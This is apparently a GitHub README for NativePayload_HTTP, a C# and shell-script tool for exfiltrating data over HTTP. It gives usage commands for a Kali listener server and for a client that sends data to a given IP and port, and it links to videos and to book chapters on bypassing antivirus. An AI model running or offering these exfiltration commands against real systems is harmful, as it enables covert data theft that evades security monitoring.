# NativePayload_HTTP
Data Exfiltration via HTTP Traffic (C# and Shell Script)

this code has two parts: 1.Server-Side and 2.Client-Side

Note:in server-side this code tested by Kali linux only! 

client-side tested by kali 2017-18 and ubuntu 14.04 also windows7 and 2012

Video [1] , Shell Script (server/client side) (linux only) : https://www.youtube.com/watch?v=vjhubCYFP4c

Video [2] , C# and Script (server/client side) (Windows/linux) : https://www.youtube.com/watch?v=7MCOko-qy0c

Related Video :

Video [3] , Codes Integration: NativePayload_CSI + NativePayload_HTTP : https://www.youtube.com/watch?v=wwMf2sg1XW0



![](https://github.com/DamonMohammadbagher/NativePayload_HTTP/blob/master/NativePayload_HTTP.png)

# 1.Server-Side (linux only):
./NativePayload_HTTP.sh -exfilwebserver

# 2.Client-Side (linux):
./NativePayload_HTTP.sh  -dumpcmd  [ServerIPv4]  [Port]  [Internal-delay]

Example: ./NativePayload_HTTP.sh  -dumpcmd   192.168.56.1  80  0.4

# 2.Client-Side (windows):
NativePayload_HTTP.exe  -dumpcmd  [ServerIPv4]  [Port] 

Example: NativePayload_HTTP.exe  -dumpcmd  192.168.56.1 80 

# Note: for more information and help (step by step) , Please read these PDF files:

NativePayload_HTTP (Part1): https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/blob/master/CH12/Bypassing%20Anti%20Viruses%20by%20C%23.NET%20Programming%20Chapter%2012-Part1.pdf

NativePayload_HTTP (Part2): https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/blob/master/CH12/Bypassing%20Anti%20Viruses%20by%20C%23.NET%20Programming%20Chapter%2012-Part2.pdf

<p><a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https://github.com/DamonMohammadbagher/NativePayload_HTTP"/></a></p>
